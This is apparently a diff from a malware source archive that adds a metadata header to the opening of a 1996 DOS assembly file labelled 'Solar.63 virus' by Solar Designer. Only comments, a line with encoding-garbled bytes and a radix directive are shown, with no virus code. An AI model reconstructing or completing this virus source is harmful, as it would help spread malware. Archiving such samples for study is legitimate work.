@@ -1,6 +1,17 @@
+; ------------------------------------------------------------
+; name      S
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 Comment ;)
 Solar.63 virus ... Coded by Solar Designer \ BPC '96
-Crypted Here->|sTå¾'sw@ ;)
+Crypted Here->|sTï¿½ï¿½'sw@ ;)
 
 .radix 16
 
